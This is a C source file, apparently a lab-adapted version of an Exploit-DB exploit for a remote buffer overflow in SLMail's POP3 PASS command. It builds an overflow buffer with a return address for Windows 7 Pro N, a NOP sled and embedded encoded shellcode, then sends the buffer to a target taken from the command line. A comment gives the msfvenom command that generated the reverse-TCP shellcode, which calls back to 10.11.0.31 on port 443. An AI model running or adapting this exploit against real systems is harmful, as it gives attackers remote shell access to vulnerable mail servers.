/*
*   Modified from https://www.exploit-db.com/exploits/643 copyright and credit remain with author.
*   643-fixed.c
*       - modified IP to accept CLI arg
*       - modified return address for Microsoft Win7 Pro N - 6.1.7601
*       - removed redundant memset
*       - updated shellcode
*       - added missing libraries
*/

#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <errno.h>
#include <netinet/in.h>
#include <netdb.h>
#include <string.h>

/* Missing Libraries */
#include <arpa/inet.h>  // Fix implicit declaration ‘inet_addr’
#include <unistd.h> // Fix implicit declaration ‘read’, 'write', 'close'
 
#define retadd "\x8f\x35\x4a\x5f" /* Microsoft Win7 Pro N - 6.1.7601 Service Pack 1 Build 7601 */
#define port 110

/*
# SHELLCODE #
msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.31 LPORT=443 EXITFUNC=thread -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d"
*/
unsigned char shellcode[] =
"\xd9\xe9\xbb\x9c\x70\x87\x97\xd9\x74\x24\xf4\x5a\x2b\xc9\xb1"
"\x52\x31\x5a\x17\x03\x5a\x17\x83\x5e\x74\x65\x62\xa2\x9d\xeb"
"\x8d\x5a\x5e\x8c\x04\xbf\x6f\x8c\x73\xb4\xc0\x3c\xf7\x98\xec"
"\xb7\x55\x08\x66\xb5\x71\x3f\xcf\x70\xa4\x0e\xd0\x29\x94\x11"
"\x52\x30\xc9\xf1\x6b\xfb\x1c\xf0\xac\xe6\xed\xa0\x65\x6c\x43"
"\x54\x01\x38\x58\xdf\x59\xac\xd8\x3c\x29\xcf\xc9\x93\x21\x96"
"\xc9\x12\xe5\xa2\x43\x0c\xea\x8f\x1a\xa7\xd8\x64\x9d\x61\x11"
"\x84\x32\x4c\x9d\x77\x4a\x89\x1a\x68\x39\xe3\x58\x15\x3a\x30"
"\x22\xc1\xcf\xa2\x84\x82\x68\x0e\x34\x46\xee\xc5\x3a\x23\x64"
"\x81\x5e\xb2\xa9\xba\x5b\x3f\x4c\x6c\xea\x7b\x6b\xa8\xb6\xd8"
"\x12\xe9\x12\x8e\x2b\xe9\xfc\x6f\x8e\x62\x10\x7b\xa3\x29\x7d"
"\x48\x8e\xd1\x7d\xc6\x99\xa2\x4f\x49\x32\x2c\xfc\x02\x9c\xab"
"\x03\x39\x58\x23\xfa\xc2\x99\x6a\x39\x96\xc9\x04\xe8\x97\x81"
"\xd4\x15\x42\x05\x84\xb9\x3d\xe6\x74\x7a\xee\x8e\x9e\x75\xd1"
"\xaf\xa1\x5f\x7a\x45\x58\x08\x8f\x91\x62\xd7\xe7\xa7\x62\xe6"
"\x4c\x2e\x84\x82\xa2\x67\x1f\x3b\x5a\x22\xeb\xda\xa3\xf8\x96"
"\xdd\x28\x0f\x67\x93\xd8\x7a\x7b\x44\x29\x31\x21\xc3\x36\xef"
"\x4d\x8f\xa5\x74\x8d\xc6\xd5\x22\xda\x8f\x28\x3b\x8e\x3d\x12"
"\x95\xac\xbf\xc2\xde\x74\x64\x37\xe0\x75\xe9\x03\xc6\x65\x37"
"\x8b\x42\xd1\xe7\xda\x1c\x8f\x41\xb5\xee\x79\x18\x6a\xb9\xed"
"\xdd\x40\x7a\x6b\xe2\x8c\x0c\x93\x53\x79\x49\xac\x5c\xed\x5d"
"\xd5\x80\x8d\xa2\x0c\x01\xad\x40\x84\x7c\x46\xdd\x4d\x3d\x0b"
"\xde\xb8\x02\x32\x5d\x48\xfb\xc1\x7d\x39\xfe\x8e\x39\xd2\x72"
"\x9e\xaf\xd4\x21\x9f\xe5";
struct sockaddr_in plm,lar,target;
 
int conn(char *ip)
{
 int sockfd;
 plm.sin_family = AF_INET;
 plm.sin_port = htons(port);
 plm.sin_addr.s_addr = inet_addr(ip);
 bzero(&(plm.sin_zero),8);
 sockfd = socket(AF_INET,SOCK_STREAM,0);
if((connect(sockfd,(struct sockaddr *)&plm,sizeof(struct sockaddr))) < 0)
{
 perror("[-] connect error!");
 exit(0);
}
 printf("[*] Connected to: %s.\n",ip);
 return sockfd;
}
 
int main(int argc, char *argv[])
{
    int xs;
    char out[1024];
    char *buffer = malloc(2606);
    memset(buffer, 0x00, 2606);
    char *off = malloc(2606);
    memset(off, 0x41, 2606);
    char *nop = malloc(13);
    memset(nop, 0x00, 13);
    memset(nop, 0x90, 12);
    strcat(buffer, off);
    strcat(buffer, retadd);
    strcat(buffer, nop);
    strcat(buffer, shellcode);

    printf("[+] SLMAIL Remote buffer overflow exploit in POP3 PASS by Haroon Rashid Astwat.\n");
    xs = conn(argv[1]);
    read(xs, out, 1024);
    printf("[*] %s", out);
    write(xs,"USER username\r\n", 15);
    read(xs, out, 1024);
    printf("[*] %s", out);
    write(xs,"PASS ",5);
    write(xs,buffer,strlen(buffer));
    printf("Shellcode len: %d bytes\n",strlen(shellcode));
    printf("Buffer len: %d bytes\n",strlen(buffer));
    write(xs,"\r\n",4);
    close(xs);  
}
